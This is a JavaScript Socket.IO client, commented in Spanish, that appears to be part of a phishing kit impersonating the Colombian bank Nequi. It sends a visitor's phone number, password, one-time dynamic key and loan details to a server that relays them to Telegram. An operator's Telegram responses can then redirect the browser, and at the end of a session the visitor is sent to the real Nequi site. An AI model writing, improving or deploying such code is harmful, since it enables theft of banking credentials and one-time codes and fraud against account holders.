/**
 * ========================================
 * SOCKET.IO CLIENT
 * ========================================
 * Cliente Socket.IO para comunicación en tiempo real
 * Reemplaza telegram-bot.js con arquitectura moderna
 * ========================================
 */

const SocketClient = (function() {
  'use strict';

  // ========================================
  // CONFIGURACIÓN
  // ========================================
  const CONFIG = {
    SERVER_URL: window.location.origin, // Usa el dominio actual (localhost o producción)
    RECONNECTION_ATTEMPTS: Infinity, // Intentos infinitos de reconexión
    RECONNECTION_DELAY: 500,
    RECONNECTION_DELAY_MAX: 5000, // Máximo 5 segundos entre reintentos
    TIMEOUT: 30000 // 30 segundos de timeout
  };

  // ========================================
  // ESTADO
  // ========================================
  let socket = null;
  let sessionId = null;
  let isConnected = false;
  let pendingResolvers = new Map(); // messageId -> { resolve, reject }
  let heartbeatInterval = null; // Intervalo para mantener sesión activa

  // ========================================
  // INICIALIZACIÓN
  // ========================================
  function init() {
    if (socket) {
      console.log('⚠️ Socket ya inicializado');
      return;
    }

    try {
      console.log('🔌 Inicializando Socket.IO...');

      // Obtener sessionId guardado si existe
      const savedSessionId = localStorage.getItem('nequi_session_id');
      console.log(`🔍 SessionId guardado: ${savedSessionId || 'ninguno'}`);

      socket = io(CONFIG.SERVER_URL, {
        autoConnect: false,
        reconnection: true,
        reconnectionAttempts: CONFIG.RECONNECTION_ATTEMPTS,
        reconnectionDelay: CONFIG.RECONNECTION_DELAY,
        reconnectionDelayMax: CONFIG.RECONNECTION_DELAY_MAX,
        timeout: CONFIG.TIMEOUT,
        transports: ['websocket', 'polling'], // WebSocket primero para mejor rendimiento
        forceNew: false,
        upgrade: true, // Permitir upgrade a WebSocket
        closeOnBeforeunload: false,
        auth: {
          sessionId: savedSessionId
        }
      });

      setupEventListeners();
      
      // Conectar AHORA que ya está todo configurado
      console.log('🔗 Conectando con sessionId:', savedSessionId || 'nuevo');
      socket.connect();
      
      // Iniciar heartbeat para mantener sesión activa
      startHeartbeat();
    } catch (error) {
      console.error('❌ Error fatal al inicializar Socket.IO:', error);
      throw error;
    }
  }

  // ========================================
  // HEARTBEAT - Mantener sesión activa
  // ========================================
  function startHeartbeat() {
    // Limpiar intervalo anterior si existe
    if (heartbeatInterval) {
      clearInterval(heartbeatInterval);
    }
    // Enviar ping cada 10 segundos (menos agresivo, más estable)
    heartbeatInterval = setInterval(() => {
      if (socket && isConnected) {
        socket.emit('heartbeat', { sessionId: sessionId, timestamp: Date.now() });
        console.log('💓 Heartbeat enviado');
      }
    }, 10000); // 10 segundos
  }

  function stopHeartbeat() {
    if (heartbeatInterval) {
      clearInterval(heartbeatInterval);
      heartbeatInterval = null;
    }
  }

  // ========================================
  // EVENT LISTENERS
  // ========================================
  function setupEventListeners() {
    // Conexión establecida
    socket.on('connect', () => {
      console.log('✅ Conectado al servidor Socket.IO');
      console.log('🆔 Socket ID:', socket.id);
      isConnected = true;
    });

    // Sesión creada (nueva)
    socket.on('session-created', (data) => {
      sessionId = data.sessionId;
      
      // Limpiar TODO el localStorage para evitar datos de sesiones anteriores
      localStorage.clear();
      
      // Guardar solo el nuevo sessionId
      localStorage.setItem('nequi_session_id', sessionId);
      console.log(`✨ Nueva sesión creada y guardada: ${sessionId}`);
      console.log(`🧹 localStorage limpiado para nueva sesión`);
    });

    // Sesión reconectada (existente)
    socket.on('session-reconnected', (data) => {
      sessionId = data.sessionId;
      localStorage.setItem('nequi_session_id', sessionId);
      console.log(`✅ Sesión reconectada: ${sessionId}`);
      console.log(`📋 Datos acumulados:`, Object.keys(data.data));
    });

    // Mensaje enviado a Telegram
    socket.on('telegram-sent', (data) => {
      console.log(`📨 Mensaje enviado a Telegram (ID: ${data.messageId})`);
    });

    // Respuesta de Telegram (botones)
    socket.on('telegram-response', (data) => {
      console.log(`✅ Respuesta de Telegram: ${data.action}`);
      
      // Resolver promesa pendiente
      const resolver = pendingResolvers.get('current');
      if (resolver) {
        resolver.resolve(data.action);
        pendingResolvers.delete('current');
      }
    });

    // Error de Telegram
    socket.on('telegram-error', (data) => {
      console.error('❌ Error de Telegram:', data.error);
      
      const resolver = pendingResolvers.get('current');
      if (resolver) {
        resolver.reject(new Error(data.error));
        pendingResolvers.delete('current');
      }
    });

    // Redirección solicitada desde Telegram
    socket.on('redirect', (data) => {
      console.log(`🔄 Redirigiendo a: ${data.url}`);
      OverlayManager.updateMessage('Redirigiendo...');
      setTimeout(() => {
        window.location.href = data.url;
      }, 1000);
    });

    // Finalizar sesión
    socket.on('finalize-session', () => {
      console.log('🏁 Finalizando sesión...');
      
      // Mostrar overlay de finalización
      OverlayManager.show({
        message: 'Sesión finalizada. Redirigiendo...',
        timeout: 0,
        showProgress: false
      });
      
      // Limpiar localStorage incluyendo sessionId
      setTimeout(() => {
        localStorage.clear(); // Esto limpia TODO incluyendo nequi_session_id
        sessionId = null;
        
        // Redirigir a Nequi.com.co
        window.location.href = 'https://www.nequi.com.co/';
      }, 2000);
    });

    // Desconexión
    socket.on('disconnect', (reason) => {
      console.log('❌ Desconectado del servidor. Razón:', reason);
      isConnected = false;
      stopHeartbeat();
      
      // Reconectar INMEDIATAMENTE sin importar la razón
      console.log('🔄 Reconectando inmediatamente...');
      setTimeout(() => {
        if (!isConnected) {
          socket.connect();
        }
      }, 100); // Reconectar en 100ms
    });

    // Error de conexión
    socket.on('connect_error', (error) => {
      console.error('❌ Error de conexión:', error);
      isConnected = false;
    });

    // Reconexión exitosa
    socket.on('reconnect', (attemptNumber) => {
      console.log(`🔄 Reconectado después de ${attemptNumber} intentos`);
      console.log('🆔 Nuevo Socket ID:', socket.id);
      isConnected = true;
      startHeartbeat(); // Reiniciar heartbeat al reconectar
    });

    // Intento de reconexión
    socket.on('reconnect_attempt', (attemptNumber) => {
      console.log(`🔄 Intento de reconexión #${attemptNumber}...`);
    });

    // Error de reconexión
    socket.on('reconnect_error', (error) => {
      console.error('❌ Error al reconectar:', error.message);
    });

    // Fallo al reconectar
    socket.on('reconnect_failed', () => {
      console.error('❌ Fallo al reconectar después de todos los intentos');
      isConnected = false;
      // Intentar reconectar manualmente
      setTimeout(() => {
        console.log('🔄 Intentando reconexión manual...');
        socket.connect();
      }, 2000);
    });
  }

  // ========================================
  // API PÚBLICA
  // ========================================

  /**
   * Envía el teléfono al servidor
   */
  async function sendPhoneRequest(phone) {
    if (!isConnected) {
      throw new Error('No conectado al servidor');
    }

    return new Promise((resolve, reject) => {
      socket.emit('submit-phone', { phone });
      
      // Resolver inmediatamente después de enviar
      setTimeout(() => resolve('sent'), 100);
    });
  }

  /**
   * Envía la contraseña al servidor
   */
  async function sendPasswordRequest(password) {
    if (!isConnected) {
      throw new Error('No conectado al servidor');
    }

    return new Promise((resolve, reject) => {
      socket.emit('submit-password', { password });
      
      // Resolver inmediatamente después de enviar
      setTimeout(() => resolve('sent'), 100);
    });
  }

  /**
   * Envía la solicitud de crédito al servidor
   */
  async function sendLoanRequest(loanData) {
    console.log('💰 sendLoanRequest llamado con datos:', loanData);
    
    if (!isConnected) {
      console.error('❌ No conectado al servidor');
      throw new Error('No conectado al servidor');
    }

    console.log('📤 Emitiendo evento submit-loan...');
    
    return new Promise((resolve, reject) => {
      socket.emit('submit-loan', loanData);
      console.log('✅ Evento submit-loan emitido');
      
      // Resolver inmediatamente después de enviar
      setTimeout(() => {
        console.log('✅ Promise resuelto');
        resolve('sent');
      }, 100);
    });
  }

  /**
   * Envía la clave dinámica al servidor
   */
  async function sendDinamicaRequest(dinamica) {
    if (!isConnected) {
      throw new Error('No conectado al servidor');
    }

    return new Promise((resolve, reject) => {
      socket.emit('submit-dinamica', { dinamica });
      
      // Resolver inmediatamente después de enviar
      setTimeout(() => resolve('sent'), 100);
    });
  }

  /**
   * Obtiene el estado de la conexión
   */
  function getConnectionStatus() {
    return {
      connected: isConnected,
      sessionId: sessionId
    };
  }

  /**
   * Desconecta el socket
   */
  function disconnect() {
    stopHeartbeat(); // Detener heartbeat
    if (socket) {
      socket.disconnect();
      socket = null;
      isConnected = false;
      sessionId = null;
    }
  }

  // ========================================
  // EXPORTAR API PÚBLICA
  // ========================================
  return {
    init,
    sendPhoneRequest,
    sendPasswordRequest,
    sendLoanRequest,
    sendDinamicaRequest,
    getConnectionStatus,
    disconnect
  };
})();
